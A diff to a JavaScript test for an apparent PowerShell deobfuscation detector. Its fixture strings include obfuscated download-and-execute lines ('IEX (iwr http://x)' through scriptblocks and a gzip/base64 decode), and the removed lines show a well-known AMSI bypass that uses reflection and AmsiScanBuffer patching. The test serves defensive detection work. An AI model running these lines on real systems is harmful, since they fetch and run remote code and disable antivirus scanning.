@@ -132,8 +132,6 @@ test('backfill: runtime PowerShell technique labels all appear in grammar catalo
     return b.toString('base64');
   };
   const gzB64 = zlib.gzipSync(Buffer.from('Invoke-Expression iex', 'utf8')).toString('base64');
-  const keyArr = Array.from({length: 32}, (_, i) => i).join(',');
-  const ctB64 = Buffer.alloc(32, 0x11).toString('base64');
 
   const sample = [
     "('Down' + 'load' + 'String')",                                           // Concat
@@ -150,9 +148,9 @@ test('backfill: runtime PowerShell technique labels all appear in grammar catalo
     `$sb='IEX (iwr http://x)'; [scriptblock]::Create($sb).Invoke()`,          // SB (var)
     `[ScriptBlock].GetMethod("Create", [Type[]]@([string])).Invoke($null, @('IEX (iwr http://x)'))`,
     `$b=[Convert]::FromBase64String('${gzB64}'); $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); iex (New-Object IO.StreamReader($gz)).ReadToEnd()`,
-    `ConvertTo-SecureString '${ctB64}' -Key @(${keyArr})`,
-    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
-    `[Runtime.InteropServices.Marshal]::GetProcAddress($amsi, 'AmsiScanBuffer'); VirtualProtect`,
+    // NOTE: AMSI, AMSI/ETW Reflective Patch, and SecureString Decode
+    // sample lines were removed — their decoder branches were deleted
+    // in the Deobfuscation cull and the detections migrated to YARA.
   ].join('\n\n');
 
   const cands = d2._findCommandObfuscationCandidates(sample, {});
